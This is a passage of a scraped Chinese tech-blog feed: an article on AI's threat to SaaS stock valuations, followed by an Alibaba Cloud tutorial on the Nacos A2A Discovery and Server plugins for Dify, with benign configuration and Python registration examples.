<p>席位费是 SaaS 公司的命根子，而 AI 正在用手术刀精准切断它。</p>
<p>于是，那些 SaaS 被「判死刑」——</p>
<p>DocuSign 暴跌，因为 Claude 能自己读懂合同并操作签署流；</p>
<p>Zendesk 崩盘，因为 AI 客服已达到 95% 人类水平；</p>
<p>HubSpot 下挫，因为 AI 现在能自动撰写、发送、跟踪营销邮件，甚至自创策略。</p>
<p>你是否还愿意为一个漂亮的 UI 付费，当 AI 可以在后台直接完成一切？</p>
<p>新的共识浮现：（软件）服务经济正面临缓慢却不可避免的消亡。随着 AI、自主机器人及其与物理世界的融合，将高端服务商品化，「人工包装」的软件曾经享有的溢价正在迅速蒸发。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/48f5078fa99e4a118ec11811dc4af976~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=Jim0AIc9Pd6llfarai78nh79%2B8A%3D" alt="" loading="lazy"/></p>
<p>更残酷的是二阶打击。</p>
<p>软件公司是云服务商最大的客户群。</p>
<p>当软件公司被 AI 颠覆，云巨头也难逃干系：  Oracle 跌 3.4%，Microsoft 跌 2.9%，英伟达跌 2.8%。</p>
<p>AMD 季度营收超预期、给出 98 亿美元强劲指引，盘后股价却跌了 5–8%——因为数据中心对内存的疯狂需求正在把成本推到天上，利润率被活活吃掉。</p>
<p><strong>「<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/31bf65300c9346ad925452e1e47aff7a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=ValgkdCpyLURC3iwou1WSTXqw%2Bk%3D" alt="" loading="lazy"/>」</strong></p>
<p><strong>「夸大了吗？」</strong></p>
<p>AI 杀死 SaaS，市场对此并不完全认同。</p>
<p>Wolfe Research（沃尔夫研究） 最新报告直言，「SaaS 之死被夸大了」。</p>
<p>一场网络研讨会，他们得出的核心观点是：<strong>「AI」</strong> <strong>「不会把」</strong> <strong>「SaaS」</strong> <strong>「一刀杀死。」</strong></p>
<p>因为很多 SaaS 卖的不是「软件代码」，而是稳定的业务流程能力 / 运营交付（可靠性、安全、集成等），AI 更可能扩大市场，不会单纯蚕食 SaaS。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7f56e74924fd4b23a780b2df4c140036~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=Wx76Owlopof0aaWuEvFnMHWkO7g%3D" alt="" loading="lazy"/></p>
<p>另一篇来自 WSJ 报道，是这么说的：AI 杀不死软件行业，只会终结它的增长神话。</p>
<p>大企业会用那种「氛围编码 APP」（vibe-coded apps）来取代高度复杂的软件平台，未免有些异想天开。</p>
<p>这些平台承载着发工资、IT 管理等核心业务，需要极深的行业知识，绝非敲几行代码那么简单。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/99a6b3e7991340afa0378f6718b67d7d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=MspqIRjLbIZhZYmS2YyAR%2BlnO%2Bw%3D" alt="" loading="lazy"/></p>
<p>当然，一些网友同样认为，SaaS 消亡确实被过分夸大了。</p>
<p>前比尔 · 盖茨的技术助理、Office 团队成员及负责人 Steven Sinofsky 直言：</p>
<p>软件已死。软件纯游戏的概念将消失在某个语言模型中。</p>
<p>胡说八道。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/74614dcb4348449fb484d60f94f955d0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=7mByfuxHXFanrz9gNa9S1Yhm7A0%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/faa5f1bc4ed44a1c81baa4b2d99c49c2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=Lb8aNcjpm6%2B9mQjt%2BcxKhe51L5o%3D" alt="" loading="lazy"/></p>
<p><strong>「奇点已至，人类开始交接权利」</strong></p>
<p>历史上，市场对软件行业的悲观情绪不是没出现过。</p>
<p>当年「移动互联网」火起来时，曾有一堆人预测微软会完蛋——谁还在用 PC，大家都去刷手机了。</p>
<p>但过去十年，微软股价涨了近 800%。</p>
<p>彭博分析师 Rana 也说：「这在软件行业其实挺常见的。真出事的时候，很多公司也无能为力。」</p>
<p>但这不是一次简单的股灾，这是**「人类经济史上最大的价值转移——从「碳基大脑」向「硅基智能」的暴力交接。」**</p>
<p>谷歌 Genie 公开发布一周内游戏股暴跌 15%；</p>
<p>视频模型如 Veo3、Higgsfield 取代人类创作者，迫使 SAG 工会为 AI 影响者征税捐助人类演员基金；</p>
<p>财富 500 强企业取消数百万美元软件合同，转用 AI 智能体平台；</p>
<p>OpenAI 和 Anthropic 与科研机构合作，推出健康功能自动化医疗、制药、研究等万亿市场；</p>
<p>GPT-5.2 和 Gemini 解决数学难题，质疑数学学位价值。</p>
<p>谁还能否认 AI 没有经济效益？谁能想到 AI 会这么快就干掉整个行业？</p>
<p>但这甚至还不是最疯狂的部分。</p>
<p>但这还不是最疯狂的，OpenAI Codex 负责人直言：「Codex 现在能自我构建，我们只需监督。」</p>
<p>Anthropic 团队也对 Claude 表达了相同观点：它能自我改进。</p>
<p>我们已进入 AI 不仅颠覆人类行业、甚至开始自动化自身迭代的阶段。</p>
<p>我们已经跨过了那道隐形的门槛——AI 不再只是颠覆人类的行业，它开始自动化自身的迭代。</p>
<p>人类与人工认知的加速融合，最终将归结为一个冷酷的方程式：算力 × 能源 × 硅片。</p>
<p>在未来的历史书中，这可能只是短短的一行字：「Anthropic 发布 Claude Cowork 与 Claude Code，标志着脑力劳动自动化的奇点来临。」</p>
<p>参考资料：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.ft.com%2Fcontent%2F48ec5657-c2e7-4111-a236-24a96a8d49e7" target="_blank" title="https://www.ft.com/content/48ec5657-c2e7-4111-a236-24a96a8d49e7" ref="nofollow noopener noreferrer">www.ft.com/content/48e…</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bloomberg.com%2Fnews%2Farticles%2F2026-02-03%2Flegal-software-stocks-plunge-as-anthropic-releases-new-ai-tool" target="_blank" title="https://www.bloomberg.com/news/articles/2026-02-03/legal-software-stocks-plunge-as-anthropic-releases-new-ai-tool" ref="nofollow noopener noreferrer">www.bloomberg.com/news/articl…</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.theguardian.com%2Ftechnology%2F2026%2Ffeb%2F03%2Fanthropic-ai-legal-tool-shares-data-services-pearson" target="_blank" title="https://www.theguardian.com/technology/2026/feb/03/anthropic-ai-legal-tool-shares-data-services-pearson" ref="nofollow noopener noreferrer">www.theguardian.com/technology/…</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.businessinsider.com%2Fanthropic-cowork-legal-plugin-publishing-stocks-legalzoom-thomson-reuters-relx-2026-2" target="_blank" title="https://www.businessinsider.com/anthropic-cowork-legal-plugin-publishing-stocks-legalzoom-thomson-reuters-relx-2026-2" ref="nofollow noopener noreferrer">www.businessinsider.com/anthropic-c…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Dify 官方上架 Nacos A2A 插件，补全双向多智能体协作能力]]></title>    <link>https://juejin.cn/post/7603219519666257939</link>    <guid>https://juejin.cn/post/7603219519666257939</guid>    <pubDate>2026-02-05T10:15:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603219519666257939" data-draft-id="7603010441149595689" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Dify 官方上架 Nacos A2A 插件，补全双向多智能体协作能力"/> <meta itemprop="keywords" content="云原生"/> <meta itemprop="datePublished" content="2026-02-05T10:15:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="阿里云云原生"/> <meta itemprop="url" content="https://juejin.cn/user/3808363977648493"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Dify 官方上架 Nacos A2A 插件，补全双向多智能体协作能力
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3808363977648493/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    阿里云云原生
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T10:15:47.000Z" title="Thu Feb 05 2026 10:15:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读14分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>作者：濯光</p>
<h2 data-id="heading-0">背景与挑战：多智能体协作中的典型问题</h2>
<p>随着 AI Agent 技术的快速发展，单一智能体已经难以满足复杂业务场景的需求。多智能体协作（Multi-Agent Collaboration）正在成为 AI 应用的主流趋势——让多个具备不同专长的智能体协同工作，共同完成复杂任务。</p>
<p>Google 于 2025 年初发布的 A2A（Agent-to-Agent）协议，为多智能体间的标准化通信提供了重要基础。A2A 协议定义了智能体之间的发现、能力描述和任务交互标准，使得不同来源、不同框架的智能体能够无缝协作。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/428a7dc0071243a6aa5bb2086a3aac0b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891346&amp;x-signature=JpRk7MpIGIaJbHbX%2BTZWrnHlMB8%3D" alt="Gemini_Generated_Image_m28lnfm28lnfm28l.png" loading="lazy"/></p>
<p>然而，<strong>Dify 平台目前原生并不支持 A2A 协议</strong>。这意味着开发者无法直接在 Dify 中发现和调用遵循 A2A 标准的智能体，缺乏与 A2A 生态进行集成的有效途径。具体来说，Dify 开发者面临以下挑战：</p>
<ul>
<li><strong>协议不兼容：</strong> Dify 原生不支持 A2A 协议，无法直接解析 AgentCard、处理 A2A 消息格式，与已有的 A2A Agent 生态完全隔离。</li>
<li><strong>智能体发现困难：</strong> 多个 A2A Agent 分散部署在不同环境中，没有标准方式让 Dify 应用发现和管理这些智能体，每次接入都需要大量定制开发。</li>
<li><strong>动态选择受限：</strong> 传统方式下，Dify 应用只能调用预先硬编码的单一智能体，无法根据实际任务需求动态选择最合适的智能体。</li>
<li><strong>协作编排复杂：</strong> 当业务需要多个智能体协作时，开发者需要在工作流中进行大量的条件判断和路由逻辑，开发和维护成本高。</li>
<li><strong>缺乏统一注册中心：</strong> 没有集中管理 A2A Agent 的平台，难以对智能体进行统一的注册、发现和治理。</li>
<li><strong>无法对外暴露：</strong> Dify 构建的智能体应用只能在 Dify 平台内使用，无法以标准协议对外提供服务，难以被其他 A2A 生态中的智能体发现和调用。</li>
</ul>
<p>这些问题导致 Dify 开发者在构建多智能体应用时，面临<strong>协议不通、接入成本高、扩展性差、灵活度低、无法对外互通</strong>的困境。</p>
<h2 data-id="heading-1">解决方案：Nacos Agent Registry + A2A 插件组合</h2>
<p>为了解决上述问题，Nacos 官方为 Dify 平台打造了<strong>双向 A2A 协议集成方案</strong>，通过两个互补的插件<strong>填补了 Dify 在 A2A 协议支持上的空白</strong>，让 Dify 应用既能调用外部 A2A 智能体，又能作为 A2A 智能体被外部系统调用。</p>
<p>Nacos 3.0 在支持 MCP Registry 的基础上，进一步拓展了对 A2A Agent 的支持能力，推出了 <strong>Nacos Agent Registry</strong>——一个统一的 AI 智能体注册与发现平台。结合 A2A 插件组合，Dify 开发者可以：</p>
<h4 data-id="heading-2">A2A Discovery 插件（调用外部智能体）</h4>
<ul>
<li><strong>打通 A2A 协议：</strong> 插件内置完整的 A2A 协议支持，自动解析 AgentCard、处理标准消息格式，让 Dify 与 A2A 生态无缝对接。</li>
<li><strong>统一智能体发现：</strong> 自动从 Nacos Agent Registry 发现所有已注册的 A2A Agent，无需手动配置每个智能体的连接信息。</li>
<li><strong>动态智能体选择：</strong> LLM 可以根据任务需求，从多个可用智能体中智能选择最合适的一个进行调用。</li>
<li><strong>灵活的发现模式：</strong> 支持 Nacos 模式和 URL 模式两种发现方式，满足不同部署场景的需求。</li>
</ul>
<h4 data-id="heading-3">A2A Server 插件（暴露 Dify 应用）</h4>
<ul>
<li><strong>标准协议暴露：</strong> 将 Dify 中的任意应用（Chatbot/Agent/Chatflow/Workflow）暴露为符合 A2A 协议标准的智能体。</li>
<li><strong>自动注册发现：</strong> 支持将 Dify 应用自动注册到 Nacos Agent Registry，让其他智能体能够发现和调用。</li>
<li><strong>多轮对话支持：</strong> 基于 Dify Plugin Storage 维护会话上下文，支持跨请求的连续对话。</li>
<li><strong>标准端点：</strong> 提供标准的 /.well-known/agent.json 端点用于智能体元数据发现。</li>
</ul>
<p>目前，Nacos 官方 A2A 插件已正式上架 Dify 官方插件市场：</p>
<ul>
<li>
<p>A2A Discovery 插件（A2A Agent Client）：
<a href="https://link.juejin.cn?target=https%3A%2F%2Fmarketplace.dify.ai%2Fplugins%2Fnacos%2Fa2a_discovery%3Flanguage%3Dzh-Hans" target="_blank" title="https://marketplace.dify.ai/plugins/nacos/a2a_discovery?language=zh-Hans" ref="nofollow noopener noreferrer">marketplace.dify.ai/plugins/nac…</a></p>
</li>
<li>
<p>A2A Server 插件：
<a href="https://link.juejin.cn?target=https%3A%2F%2Fmarketplace.dify.ai%2Fplugins%2Fnacos%2Fa2a_server%3Flanguage%3Dzh-Hans" target="_blank" title="https://marketplace.dify.ai/plugins/nacos/a2a_server?language=zh-Hans" ref="nofollow noopener noreferrer">marketplace.dify.ai/plugins/nac…</a></p>
</li>
</ul>
<h3 data-id="heading-4">整体架构</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/370e55e9979a45f4b8108f6e2e3b142f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891346&amp;x-signature=YY8%2BHjWYk2m%2B9jYgPyXIZVL2dbc%3D" alt="image_1769060277140.png" loading="lazy"/></p>
<h2 data-id="heading-5">核心功能详解</h2>
<h3 data-id="heading-6">3.1 A2A Discovery 插件：调用外部智能体</h3>
<h4 data-id="heading-7">3.1.1 两种智能体发现模式</h4>
<p><strong>Nacos 模式（推荐）</strong></p>
<p>通过 Nacos Agent Registry 统一管理和发现智能体。只需在 Nacos 中注册 A2A Agent，Dify 应用即可自动发现并调用。</p>
<p>优势：</p>
<ul>
<li>集中化管理，智能体信息统一维护。</li>
<li>支持动态注册和注销，无需重启 Dify 应用。</li>
<li>与 Nacos 生态无缝集成，享受企业级治理能力。</li>
</ul>
<p>配置示例：</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-symbol">discovery_type:</span> nacos
<span class="hljs-symbol">available_agent_names:</span> translator_agent,search_agent,code_agent
<span class="hljs-symbol">namespace_id:</span> <span class="hljs-keyword">public</span>
</code></pre>
<p><strong>URL 模式</strong></p>
<p>直接通过 A2A Agent 的标准 URL 进行发现，适合无需 Nacos 的轻量级场景。</p>
<p>配置示例：</p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">discovery_type: url</span>
<span class="hljs-section">available_agent_urls: {</span>
  <span class="hljs-string">"translator_agent"</span>: <span class="hljs-string">"http://host1:8080/.well-known/agent.json"</span>,
  <span class="hljs-string">"search_agent"</span>: <span class="hljs-string">"http://host2:8080/.well-known/agent.json"</span>
}
</code></pre>
<h4 data-id="heading-8">3.1.2 两个核心工具</h4>
<p><strong>获取智能体信息（get_a2a_agent_information）</strong></p>
<p>查询所有配置的 A2A Agent 的详细信息，包括：</p>
<ul>
<li>智能体名称（agent_name）</li>
<li>功能描述（description）</li>
<li>技能列表（skills）</li>
</ul>
<p>LLM 通过这些信息了解每个智能体的能力，为后续的智能选择提供依据。</p>
<p><strong>调用智能体（call_a2a_agent）</strong></p>
<p>根据 LLM 的选择，向指定的 A2A Agent 发送查询消息并获取响应。支持：</p>
<ul>
<li>动态选择目标智能体</li>
<li>自定义查询消息</li>
<li>完整的上下文传递</li>
</ul>
<h4 data-id="heading-9">3.1.3 智能体动态选择工作流</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1988b532193a42c685e2849ba142412c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891346&amp;x-signature=IJsaPYiflwWTmlO1nR1sMktqR6k%3D" alt="图片" loading="lazy"/></p>
<p>通过以上两种工具协同配合，Dify 中的 Agent 可以实现：</p>
<ol>
<li>
<p>全面了解可用的智能体资源</p>
</li>
<li>
<p>根据具体任务智能匹配最佳智能体</p>
</li>
<li>
<p>实现真正的多智能体动态协作</p>
</li>
</ol>
<h3 data-id="heading-10">3.2 A2A Server 插件：暴露 Dify 应用</h3>
<p>A2A Server 插件让 Dify 应用能够以标准 A2A 协议对外提供服务，使其他智能体能够发现和调用。</p>
<h4 data-id="heading-11">3.2.1 支持的应用类型</h4>
<p>A2A Server 支持将以下类型的 Dify 应用暴露为 A2A 智能体：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1fd1a4d88df84e83ad4c8fd42c4e2394~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891346&amp;x-signature=q9xUfSYv9y9Yjr8ioQS7lGkCLss%3D" alt="图片" loading="lazy"/></p>
<h4 data-id="heading-12">3.2.2 两个核心端点</h4>
<p><strong>智能体元数据端点（GET /.well-known/agent.json）</strong></p>
<p>返回符合 A2A 协议的 AgentCard，包含：</p>
<ul>
<li>智能体名称（name）</li>
<li>功能描述（description）</li>
<li>访问地址（url）</li>
<li>版本信息（version）</li>
<li>能力声明（capabilities）</li>
<li>技能列表（skills）</li>
</ul>
<p>外部调用方通过此端点发现智能体的能力和调用方式。</p>
<p><strong>JSON-RPC 调用端点（POST /a2a）</strong></p>
<p>处理 A2A 协议标准的 JSON-RPC 请求。支持：</p>
<ul>
<li><code>message/send</code> 方法：向智能体发送消息并获取响应</li>
<li>多轮对话上下文维护</li>
<li>完整的任务状态管理</li>
</ul>
<h4 data-id="heading-13">3.2.3 Nacos 自动注册</h4>
<p>启用 Nacos 注册后，A2A Server 会在首次收到 AgentCard 请求时自动将 Dify 应用注册到 Nacos Agent Registry。注册后，其他 A2A 智能体可以通过 Nacos 发现并调用该 Dify 应用。</p>
<h4 data-id="heading-14">3.2.4 多轮对话支持</h4>
<p>A2A Server 基于 Dify Plugin Storage 实现跨请求的会话上下文管理：</p>
<ul>
<li>自动维护 conversation_id 映射</li>
<li>支持连续多轮对话</li>
<li>会话状态持久化存储</li>
</ul>
<h2 data-id="heading-15">实践教程：构建多智能体协作应用</h2>
<p>本章将通过两个具体案例，分别演示 A2A Discovery 和 A2A Server 插件的使用方法。</p>
<h3 data-id="heading-16">4.1 使用 A2A Discovery 调用外部智能体</h3>
<p>让我们通过一个具体案例，演示如何使用 A2A Discovery 插件构建一个多智能体协作的 AI 助手。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d9ee4399a33c4d3fabc4520807525414~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891346&amp;x-signature=HGuNRa3uJy3Ns6JXbGBX2UMYtsw%3D" alt="Gemini_Generated_Image_th1f2vth1f2vth1f.png" loading="lazy"/></p>
<h4 data-id="heading-17">场景描述</h4>
<p>假设我们要构建一个智能客服系统，需要调用以下三个专业智能体：</p>
<ul>
<li><strong>翻译智能体：</strong> 处理多语言翻译需求</li>
<li><strong>搜索智能体：</strong> 查询产品信息和知识库</li>
<li><strong>客服智能体：</strong> 处理订单查询和售后问题</li>
</ul>
<h4 data-id="heading-18">步骤一：在 Nacos 注册 A2A Agent</h4>
<p>将 A2A Agent 注册到 Nacos Agent Registry 有两种方式：</p>
<p><strong>方式一：控制台手动注册</strong></p>
<ol>
<li>登录 MSE Nacos 控制台2. 进入「智能体注册中心」3. 添加各个 A2A Agent 的信息（名称、访问地址、描述等）</li>
</ol>
<p><strong>方式二：AgentScope 自动注册（推荐）</strong></p>
<p>AgentScope <strong>[</strong> <strong>1]</strong> 是阿里巴巴推出的一款以开发者为核心，专注于多智能体开发的开源框架。它的核心目标是解决智能体在构建、运行和管理中的难题，提供一套覆盖“开发、部署、监控”全生命周期的生产级解决方案。</p>
<p>AgentScope 最新版本中，已经全面支持 A2A 协议，并集成 Nacos 作为 A2A Registry 的默认实现，构建了一套从开发到部署的完整分布式多智能体协作体系。使用 AgentScope 构建的 A2A Agent 可以自动注册到 Nacos，无需手动配置。以下为参考代码：</p>
<pre><code class="hljs language-ini" lang="ini">from agentscope_runtime.engine.app import AgentApp
from agentscope_runtime.engine.deployers.adapter.a2a import (
AgentCardWithRuntimeConfig,
)
from agentscope_runtime.engine.deployers.adapter.a2a.nacos_a2a_registry import (
NacosRegistry,
)
from v2.nacos import ClientConfigBuilder
<span class="hljs-comment"># 创建 Nacos Registry 实例</span>
<span class="hljs-attr">registry</span> = NacosRegistry(
    <span class="hljs-attr">nacos_client_config</span>=ClientConfigBuilder()
    .server_address("mse-xxx.nacos.mse.aliyuncs.com:8848")
    <span class="hljs-comment"># 其他可选配置项</span>
    .build()
)
<span class="hljs-attr">app</span> = AgentApp(
    <span class="hljs-attr">app_name</span>=<span class="hljs-string">"translator_agent"</span>,
    <span class="hljs-attr">app_description</span>=<span class="hljs-string">"TestAgent"</span>,
    <span class="hljs-comment"># 在 a2a_config 中配置 registry</span>
    <span class="hljs-attr">a2a_config</span>=AgentCardWithRuntimeConfig(registry=registry),
)
</code></pre>
<p>更多集成方式请参考 AgentScope 官方文档 <strong>[</strong> <strong>2]</strong> 。</p>
<h4 data-id="heading-19">步骤二：安装配置 A2A Discovery 插件</h4>
<ol>
<li>
<p>在 Dify 插件市场搜索「A2A Agent Client」或直接访问插件页面 <strong>[</strong> <strong>3]</strong></p>
</li>
<li>
<p>点击安装插件</p>
</li>
<li>
<p>配置 Nacos 连接信息：</p>
</li>
</ol>
